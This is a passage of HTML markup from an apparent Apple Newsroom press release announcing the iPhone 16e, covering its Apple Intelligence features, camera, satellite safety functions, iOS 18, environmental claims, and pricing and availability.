                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-0f752465b9c1e9370e2a0c7fa9ee7ae8" href="#gallery-0f752465b9c1e9370e2a0c7fa9ee7ae8" data-ac-gallery-trigger="gallery-0f752465b9c1e9370e2a0c7fa9ee7ae8"><span>Image Playground editor displayed on iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-75d55735cd62ecede6a522b7a89908f7" href="#gallery-75d55735cd62ecede6a522b7a89908f7" data-ac-gallery-trigger="gallery-75d55735cd62ecede6a522b7a89908f7"><span>Genmoji creation on iPhone 16e.</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
                        <div id="gallery-0f752465b9c1e9370e2a0c7fa9ee7ae8" aria-labelledby="gallery-dotnav-0f752465b9c1e9370e2a0c7fa9ee7ae8" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:image-playground">
                                
                                <div>
                                    <div>Image Playground allows users to easily create fun and unique images, with concepts like themes, costumes, accessories, and places.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Apple-Intelligence-Image-Playground-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Apple-Intelligence-Image-Playground-250219_inline" aria-label="Download media, Image Playground editor displayed on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-75d55735cd62ecede6a522b7a89908f7" aria-labelledby="gallery-dotnav-75d55735cd62ecede6a522b7a89908f7" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:genmoji">
                                
                                <div>
                                    <div>Users can create their&nbsp;own unique Genmoji, making conversations with family and friends more fun and playful.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Apple-Intelligence-Genmoji-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Apple-Intelligence-Genmoji-250219_inline" aria-label="Download media, Genmoji creation on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>With access to ChatGPT seamlessly integrated into Writing Tools and Siri, users can choose to access ChatGPT’s expertise without jumping between applications,&nbsp;so they can get things done faster and easier than ever before. In addition, users can access ChatGPT for free without creating an account, and privacy protections are built in — their IP addresses are obscured and OpenAI won’t store requests. Users can choose whether to enable ChatGPT integration, and are in full control of when to use it and what information is shared with ChatGPT.
</div>
 

    
    
    


    
    <div data-component-list="ScrollAnimationDefault AutoPlayVideo">
        <div>With Siri, users can choose to access ChatGPT’s expertise without jumping between applications.</div>
        
            <a aria-label="Download video: Speak to Siri on iPhone 16e" data-analytics-title="Download video - Speak to Siri on iPhone 16e" download="" href="https://www.apple.com/newsroom/videos/2025/autoplay/02/apple-iphone-16e-apple-intelligence-speak-to-siri-with-chat-gpt-250219/downloads/Apple-iPhone-16e-Apple-Intelligence-Speak-to-Siri-with-Chat-GPT-250219.zip">
            </a>
        
    </div>






    
    
    


     
     
    
    
        <div>
             
                 <div>Apple Intelligence marks an extraordinary step forward for privacy in AI and is designed to protect users’ privacy at every step. It starts with on-device processing, meaning that many of the models that power Apple Inteligence run entirely on device. For requests that require access to larger models, Apple’s groundbreaking Private Cloud Compute extends the privacy and security of iPhone into the cloud to unlock even more intelligence. When using Private Cloud Compute, users’ data is never stored or shared with Apple; it is used only to fulfill their request.
</div>
                 
             
                 <h2><strong>Access Favorite Features and Unlock Visual Intelligence with the Action Button</strong>
</h2>
                 
             
                 <div>iPhone 16e features the Action button, allowing users to easily access a variety of functions with just a press. Once customized in Settings, the Action button can be used to quickly open the camera or flashlight; switch between Ring and Silent modes; recognize music with Shazam; activate Voice Memos, Focus, Translate, and accessibility features like Magnifier; or use Shortcuts for more options. The Action button can even access in-app functionality like launching the camera in Snapchat, unlocking a car door with FordPass, tracking a child’s sleep schedule with Napper, and more.
</div>
                 
             
         </div>
 

    
    
    


    
    <div data-component-list="ScrollAnimationDefault AutoPlayVideo">
        <div>The Action button allows users to quickly access their favorite features. By default, it switches between Ring and Silent, or users can choose from a wide set of actions for even more convenience and versatility.</div>
        
            <a aria-label="Download video: Action button on iPhone 16e" data-analytics-title="Download video - Action button on iPhone 16e" download="" href="https://www.apple.com/newsroom/videos/2025/autoplay/02/apple-iphone-16e-action-button-250219/downloads/Apple-iPhone-16e-Action-button-250219.zip">
            </a>
        
    </div>






    
    
    


     
     
    
    
        <div>The Action button on iPhone 16e also unlocks a new visual intelligence experience that builds on Apple Intelligence to help users learn about objects and places. Visual intelligence can summarize and copy text, translate text between languages, detect phone numbers or email addresses with the option to add to contacts, identify an animal or plant, and more. Visual intelligence also allows users to search Google so they can see where they can buy an item, or benefit from ChatGPT’s problem-solving skills. Users are in control of when third-party tools are used and what information is shared.
</div>
 

    
    
    


    
        
        
        
        
            <figure aria-label="Media, An image of a plant with a description from ChatGPT using the Action button for visual intelligence.">
                <div>
                         
                            
                            <div>
                                With the Action button on iPhone 16e, users can also access visual intelligence to learn about objects and places around them.
                            </div>
                        
                        
                        
                        
                        <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Visual-Intelligence-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Visual-Intelligence-250219_inline" aria-label="Download media, An image of a plant with a description from ChatGPT using the Action button for visual intelligence."></a>
                    </div>
            </figure>
        
    










    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>A Powerful Camera System to Capture Any Moment</strong>
</h2>
                 
             
                 <div>The powerful 2-in-1 camera system on iPhone 16e is perfect for capturing everyday moments and important memories, including in Night mode and Portrait mode. Using computational photography, the 48MP Fusion camera takes super-high-resolution photos, so users can capture gorgeous images that balance light and detail. With an integrated 2x Telephoto, users have the equivalent of two cameras in one, and can zoom in with optical quality to get closer to the subject and easily frame their shot. And the front-facing TrueDepth camera with autofocus enables sharper close-ups and beautiful group selfies. The latest generation of HDR captures subjects and the background with true-to-life renderings of skin tones, while ensuring photos have bright highlights, rich mid-tones, and deep shadows.
</div>
                 
             
         </div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="iphone-16e-camera-features">
            <nav role="presentation">
                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-d3c9a461d9581f37bbb12d9e4e6023b0" href="#gallery-d3c9a461d9581f37bbb12d9e4e6023b0" data-ac-gallery-trigger="gallery-d3c9a461d9581f37bbb12d9e4e6023b0"><span>A photo taken with the 48MP Fusion camera on iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-bc01c7effeed35fd6e4f857270a2a847" href="#gallery-bc01c7effeed35fd6e4f857270a2a847" data-ac-gallery-trigger="gallery-bc01c7effeed35fd6e4f857270a2a847"><span>A photo taken using the 2x Telephoto with the 48MP Fusion camera on iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-f07ae6ece358a45575bf135ee487c501" href="#gallery-f07ae6ece358a45575bf135ee487c501" data-ac-gallery-trigger="gallery-f07ae6ece358a45575bf135ee487c501"><span>A photo taken in Portrait mode on the iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-31f8e16a2765d9b0339be19f4ebc3159" href="#gallery-31f8e16a2765d9b0339be19f4ebc3159" data-ac-gallery-trigger="gallery-31f8e16a2765d9b0339be19f4ebc3159"><span>A photo taken at night using iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-4e6d09758e26272bc67614287e509eb2" href="#gallery-4e6d09758e26272bc67614287e509eb2" data-ac-gallery-trigger="gallery-4e6d09758e26272bc67614287e509eb2"><span>A photo taken in low light using iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-f9210535455b3b5ddfce995bd006f9fa" href="#gallery-f9210535455b3b5ddfce995bd006f9fa" data-ac-gallery-trigger="gallery-f9210535455b3b5ddfce995bd006f9fa"><span>A selfie taken using the front-facing TrueDepth camera on iPhone 16e.</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
                        <div id="gallery-d3c9a461d9581f37bbb12d9e4e6023b0" aria-labelledby="gallery-dotnav-d3c9a461d9581f37bbb12d9e4e6023b0" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:fusion-camera">
                                
                                <div>
                                    <div>iPhone 16e features a custom 48MP Fusion camera to take beautiful photos and videos.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-48MP-Fusion-photography-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-48MP-Fusion-photography-250219_big" aria-label="Download media, A photo taken with the 48MP Fusion camera on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-bc01c7effeed35fd6e4f857270a2a847" aria-labelledby="gallery-dotnav-bc01c7effeed35fd6e4f857270a2a847" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:telephoto">
                                
                                <div>
                                    <div>With an integrated 2x Telephoto, the 48MP Fusion camera delivers the capability of two cameras in one, so users can zoom in with optical quality.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Fusion-2x-Telephoto-photography-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Fusion-2x-Telephoto-photography-250219_big" aria-label="Download media, A photo taken using the 2x Telephoto with the 48MP Fusion camera on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-f07ae6ece358a45575bf135ee487c501" aria-labelledby="gallery-dotnav-f07ae6ece358a45575bf135ee487c501" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:portrait-mode">
                                
                                <div>
                                    <div>iPhone 16e features Portrait mode, which creates beautiful studio-like images of a subject.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Portrait-mode-photography-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Portrait-mode-photography-250219_big" aria-label="Download media, A photo taken in Portrait mode on the iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-31f8e16a2765d9b0339be19f4ebc3159" aria-labelledby="gallery-dotnav-31f8e16a2765d9b0339be19f4ebc3159" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:night-mode">
                                
                                <div>
                                    <div>Night mode on iPhone 16e captures more detail in photos when it is dark.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Night-mode-photography-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Night-mode-photography-250219_big" aria-label="Download media, A photo taken at night using iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-4e6d09758e26272bc67614287e509eb2" aria-labelledby="gallery-dotnav-4e6d09758e26272bc67614287e509eb2" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:low-light">
                                
                                <div>
                                    <div>Users can capture memories of friends and family — even in different lighting conditions.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-low-light-photography-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-low-light-photography-250219_big" aria-label="Download media, A photo taken in low light using iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-f9210535455b3b5ddfce995bd006f9fa" aria-labelledby="gallery-dotnav-f9210535455b3b5ddfce995bd006f9fa" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:truedepth">
                                
                                <div>
                                    <div>The front-facing TrueDepth camera takes gorgeous selfies and videos with great color and detail.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-front-facing-TrueDepth-photography-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-front-facing-TrueDepth-photography-250219_big" aria-label="Download media, A selfie taken using the front-facing TrueDepth camera on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>iPhone 16e takes stunning videos with the ability to record in 4K with Dolby Vision up to 60 fps, and users can stop and restart a recording for more flexibility when capturing the moment. iPhone 16e also records video in Spatial Audio for immersive listening with AirPods, Apple Vision Pro, or a surround sound system, and enables more ways to edit video sound with Audio Mix. Users can adjust their sound after capture to focus on the voice of the person on camera, make it sound like the video was recorded inside a professional studio, or position vocal tracks in the front and environmental noises in surround sound. With wind noise reduction, powerful ML algorithms automatically reduce unwanted noise for better audio quality.
</div>
 

    
    
    


    
    <div data-component-list="ScrollAnimationDefault AutoPlayVideo">
        <div>iPhone 16e can capture stunning 4K video at 60 fps in Dolby Vision.</div>
        
            <a aria-label="Download video: 4K video on iPhone 16e" data-analytics-title="Download video - 4K video on iPhone 16e" download="" href="https://www.apple.com/newsroom/videos/2025/autoplay/02/apple-iphone-16e-4k-video-with-dolby-vision-250219/downloads/Apple-iPhone-16e-4K-video-with-Dolby-Vision-250219.zip">
            </a>
        
    </div>






    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>Groundbreaking Safety and Communication Capabilities</strong>
</h2>
                 
             
                 <div>iPhone 16e helps users stay connected and get assistance when it matters most. Apple’s satellite features help users text via satellite when they’re outside of cellular and Wi-Fi coverage. This includes Messages via satellite to text friends and family; Emergency SOS via satellite to connect with emergency services; and Roadside Assistance via satellite to reach a roadside assistance provider in case of car trouble. Users can also use the Find My app to share their location via satellite, reassuring friends and family of their whereabouts while traveling off the grid. Crash Detection on iPhone 16e can detect a severe car crash and automatically dial emergency services if a user is unconscious or unable to reach their iPhone.<sup>5</sup>
</div>
                 
             
         </div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="iphone-16e-emergency-services">
            <nav role="presentation">
                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-76ed2f2456096dcab6f6f3e15745395f" href="#gallery-76ed2f2456096dcab6f6f3e15745395f" data-ac-gallery-trigger="gallery-76ed2f2456096dcab6f6f3e15745395f"><span>Messages via satellite displayed on iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-fb08b0775c8a8564358de47c4c0d96dc" href="#gallery-fb08b0775c8a8564358de47c4c0d96dc" data-ac-gallery-trigger="gallery-fb08b0775c8a8564358de47c4c0d96dc"><span>Emergency SOS via satellite displayed on iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-9ef0bdcebc4284b3335f21b1f9e6debb" href="#gallery-9ef0bdcebc4284b3335f21b1f9e6debb" data-ac-gallery-trigger="gallery-9ef0bdcebc4284b3335f21b1f9e6debb"><span>Find My app via satellite displayed on iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-c2e7464af01f9aee9794f49751c3d0a4" href="#gallery-c2e7464af01f9aee9794f49751c3d0a4" data-ac-gallery-trigger="gallery-c2e7464af01f9aee9794f49751c3d0a4"><span>Roadside Assistance via satellite displayed on iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-9a476baaf0e4a5b5fab5c93950abae84" href="#gallery-9a476baaf0e4a5b5fab5c93950abae84" data-ac-gallery-trigger="gallery-9a476baaf0e4a5b5fab5c93950abae84"><span>Crash Detection displayed on iPhone 16e.</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
                        <div id="gallery-76ed2f2456096dcab6f6f3e15745395f" aria-labelledby="gallery-dotnav-76ed2f2456096dcab6f6f3e15745395f" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:messages-via-satellite">
                                
                                <div>
                                    <div>iPhone 16e offers groundbreaking satellite features, including Messages, Find My, Roadside Assistance, and Emergency SOS via satellite.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Messages-via-satellite-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Messages-via-satellite-250219_inline" aria-label="Download media, Messages via satellite displayed on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-fb08b0775c8a8564358de47c4c0d96dc" aria-labelledby="gallery-dotnav-fb08b0775c8a8564358de47c4c0d96dc" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:emergency-sos-via-satellite">
                                
                                <div>
                                    <div>Emergency SOS via satellite enables users to message with emergency services while outside of cellular and Wi-Fi coverage.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Emergency-SOS-via-satellite-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Emergency-SOS-via-satellite-250219_inline" aria-label="Download media, Emergency SOS via satellite displayed on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-9ef0bdcebc4284b3335f21b1f9e6debb" aria-labelledby="gallery-dotnav-9ef0bdcebc4284b3335f21b1f9e6debb" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:find-my">
                                
                                <div>
                                    <div>When users want to reassure friends and family of their whereabouts while traveling off the grid, they can open the Find My app and share their location via satellite.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Find-My-via-satellite-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Find-My-via-satellite-250219_inline" aria-label="Download media, Find My app via satellite displayed on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-c2e7464af01f9aee9794f49751c3d0a4" aria-labelledby="gallery-dotnav-c2e7464af01f9aee9794f49751c3d0a4" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:roadside-assistance">
                                
                                <div>
                                    <div>Roadside Assistance via satellite can connect users to a roadside assistance provider if they have car trouble while outside of cellular and Wi-Fi coverage.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Roadside-Assistance-via-satellite-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Roadside-Assistance-via-satellite-250219_inline" aria-label="Download media, Roadside Assistance via satellite displayed on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-9a476baaf0e4a5b5fab5c93950abae84" aria-labelledby="gallery-dotnav-9a476baaf0e4a5b5fab5c93950abae84" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:crash-detection">
                                
                                <div>
                                    <div>Crash Detection can detect a severe car crash and automatically dial emergency services when a user is unconscious or unable to reach their iPhone.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-Crash-Detection-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-Crash-Detection-250219_inline" aria-label="Download media, Crash Detection displayed on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>Featuring iOS 18</strong>
</h2>
                 
             
                 <div>iOS 18 makes iPhone 16e more personal, capable, and intelligent than ever.<sup>6</sup> With more customization options, users can give apps and widgets a new dark or tinted look and arrange them in any open space on the Home Screen. The controls at the bottom of the Lock Screen can be customized; Control Center has been redesigned to provide users with easier access to many of the things they use every day, including third-party apps; and new privacy protections include the ability to lock and hide apps to protect sensitive apps and the information inside them. iOS 18 also provides powerful updates for staying connected. In Messages, users can use text effects to bring words, phrases, sentences, and more to life. Tapbacks expand to include emoji, Genmoji, or stickers, and now users can schedule a message to send later. When messaging contacts who do not have an Apple device, the Messages app now supports RCS for richer media and more reliable group messaging when compared to SMS and MMS.
</div>
                 
             
         </div>
 

    
    
    


    
    
        
        
        
            <div role="group" aria-label="gallery" data-component-list="MixinGallery" id="iphone-16e-ios-18">
            <nav role="presentation">
                <ul role="tablist">
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-c198601073d9d47cf5bd3d036cb017d2" href="#gallery-c198601073d9d47cf5bd3d036cb017d2" data-ac-gallery-trigger="gallery-c198601073d9d47cf5bd3d036cb017d2"><span>A customized lock screen on iPhone 16e.</span></a>
                        </li>
                    
                        <li role="presentation">
                            <a id="gallery-dotnav-677d3b64e77c297635283828eef16f4a" href="#gallery-677d3b64e77c297635283828eef16f4a" data-ac-gallery-trigger="gallery-677d3b64e77c297635283828eef16f4a"><span>A customized Home Screen displayed on iPhone 16e.</span></a>
                        </li>
                    
                </ul>
            </nav>
            <div>
                
                    
                        
                        <div id="gallery-c198601073d9d47cf5bd3d036cb017d2" aria-labelledby="gallery-dotnav-c198601073d9d47cf5bd3d036cb017d2" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:customized-lock-screen">
                                
                                <div>
                                    <div>With iOS 18, users can choose between a light, dark, or tinted look for their app icons to create the experience that is perfect for them.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-iOS-18-customized-icons-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-iOS-18-customized-icons-250219_inline" aria-label="Download media, A customized lock screen on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
                    
                        
                        <div id="gallery-677d3b64e77c297635283828eef16f4a" aria-labelledby="gallery-dotnav-677d3b64e77c297635283828eef16f4a" data-gallery-item="">
                            <figure role="presentation" data-analytics-activitymap-region-id="Gallery:customized-home-screen">
                                
                                <div>
                                    <div>The Home Screen can be customized by arranging apps and widgets in any open space.</div>
                                    
                                    
                                    <a href="https://www.apple.com/newsroom/images/2025/02/apple-debuts-iphone-16e-a-powerful-new-member-of-the-iphone-16-family/article/Apple-iPhone-16e-iOS-18-customized-Home-Screen-250219.zip" download="" data-analytics-title="download image - Apple-iPhone-16e-iOS-18-customized-Home-Screen-250219_inline" aria-label="Download media, A customized Home Screen displayed on iPhone 16e."></a>
                                </div>
                            </figure>
                        </div>
                        
                    
                
            </div>
            
                
                
                <nav role="presentation">
                    
                        <ul>
                            <li>
                                
                            </li>
                            <li>
                                
                            </li>
                        </ul>
                    
                </nav>
            
        </div>
    


    
    
    


     
     
    
    
        <div>
             
                 <h2><strong>Better for the Environment</strong>
</h2>
                 
             
                 <div>iPhone 16e is designed with the environment in mind. As part of Apple 2030, the company’s ambitious goal to be carbon neutral across its entire carbon footprint by the end of this decade, Apple is transitioning to renewable electricity for its manufacturing, and investing in wind and solar projects around the world to address the electricity used to charge all Apple products, including iPhone 16e. Today, all Apple facilities run on 100 percent renewable electricity — including the data centers that power Apple Intelligence.
</div>
                 
             
                 <div>To achieve Apple 2030, the company is designing products with more recycled and renewable materials, which further drives down the carbon footprint. iPhone 16e features over 30 percent recycled content overall, including 100 percent recycled cobalt and 95 percent recycled lithium in the battery, 85 percent recycled aluminum in the enclosure, and more.<sup>7</sup> Additionally, the main logic board and back glass of iPhone 16e are designed to be manufactured more efficiently, reducing the amount of raw materials needed. The packaging is also entirely fiber-based, bringing Apple closer to its goal of removing plastic from its packaging by the end of this year.<sup>8</sup>
</div>
                 
             
         </div>
 

    
    
    


     
     
    
    
        <div>
             
                 
                 
             
                 <div><ul>
<li>iPhone 16e will be available in white and black in 128GB, 256GB, and 512GB storage capacities, starting at <strong>$599</strong> (U.S.) or <strong>$24.95</strong> (U.S.) per month for 24 months.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Apple offers great ways to save and upgrade to the latest iPhone. With Apple Trade In, customers can get up to&nbsp;<strong>$120</strong>&nbsp;(U.S.) in credit when they trade in iPhone 11, or up to&nbsp;<strong>$170</strong>&nbsp;(U.S.) in credit when they trade in iPhone 12. With a carrier offer, customers can get&nbsp;up to&nbsp;<strong>$400</strong>&nbsp;(U.S.)&nbsp;in credit when they trade in iPhone 11, or&nbsp;up to<strong>&nbsp;$599&nbsp;</strong>(U.S.) in credit when they trade in iPhone 12 to put toward an iPhone 16e. Customers can take advantage of these offers by visiting the Apple Store online or an Apple Store location. For carrier offer eligibility requirements and more details, see <a href="https://www.apple.com/shop/buy-iphone/carrier-offers/" target="_blank">apple.com/shop/buy-iphone/carrier-offers</a>. To see what their device is worth and for Apple Trade In terms and conditions, customers can visit <a href="https://www.apple.com/shop/trade-in/" target="_blank">apple.com/shop/trade-in</a>.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Customers in 59 countries and regions, including <em>Australia</em>, <em>Canada</em>, <em>China</em>, <em>France</em>, <em>Germany</em>, <em>India</em>, <em>Japan</em>, <em>Malaysia</em>, <em>Mexico</em>, <em>South Korea</em>, <em>Türkiye</em>, the <em>UAE</em>, the<em> UK</em>, and the <em>U.S.</em>, will be able to pre-order iPhone 16e beginning at 5 a.m. PST on Friday, February 21, with availability beginning Friday, February 28.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Apple Intelligence is available in localized English for Australia, Canada, Ireland, New Zealand, South Africa, the UK, and the U.S. Additional languages — including French, German, Italian, Portuguese (Brazil), Spanish, Japanese, Korean, Chinese (simplified), English (Singapore), and English (India) — will be available in April, with more languages coming over the course of the year, including Vietnamese. Some features, applications, and services may not be available in all regions or all languages.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Visual intelligence is available in iOS 18.2 or later on all iPhone 16 models. For more information on visual intelligence, visit <a href="https://support.apple.com/guide/iphone/use-visual-intelligence-with-camera-control-iph12eb1545e/ios/" target="_blank">support.apple.com/guide/iphone</a>.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>iPhone 16e Silicone Case will be available in five colors for<strong> $39</strong> (U.S.): winter blue, fuchsia, lake green, black, and white.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>AppleCare+ for iPhone provides unparalleled service and support. This includes unlimited incidents of accidental damage, battery service coverage, and 24/7 support from the people who know iPhone best. For more information, visit <a href="https://www.apple.com/support/products/iphone/" target="_blank">apple.com/support/products/iphone</a>.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>iCloud+ plans start at just <strong>$0.99</strong> (U.S.) per month and offer up to 12TB of additional storage to keep photos, videos, files, and more safe in the cloud and available across devices. An iCloud+ subscription gives access to premium features such as unlimited event creation in the new Apple Invites app, as well as Private Relay, Hide My Email, and custom email domains. With Family Sharing, users can share their subscription with five other family members at no extra cost.</li>
</ul>
</div>
                 
             
                 <div><ul>
<li>Customers who purchase iPhone 16e may receive three free months of Apple Music, Apple TV+, Apple Arcade, Apple News+, and Apple Fitness+, with a new subscription. Offer and services availability varies by region. See <a href="https://www.apple.com/promo/" target="_blank">apple.com/promo</a> for details.</li>
</ul>
</div>
                 
             
         </div>
 

    
    
    




    
    
        
    


    
    
    



    
    
    




    




    
    
    





    
    
    <div>
            <ol>
<li>Apple’s satellite features are included for free for two years starting at the time of activation of a new iPhone 14 or later. For Emergency SOS via satellite availability, visit <a href="https://support.apple.com/en-us/HT213426" target="_blank">support.apple.com/en-us/HT213426</a>. Messages via satellite will be available in the U.S. and Canada in iOS 18 or later. SMS availability will depend on carrier. Carrier fees may apply. Users should check with their carrier for details. Roadside Assistance via satellite is currently available in the U.S. with AAA and Verizon Roadside Assistance, and in the UK with Green Flag. Participating roadside assistance providers may charge for services, and iPhone users who are not members can take advantage of their roadside assistance services on a pay-per-use basis. Apple’s satellite features were designed for use in open spaces with a clear line of sight to the sky. Performance may be impacted by obstructions such as trees or surrounding buildings.</li>
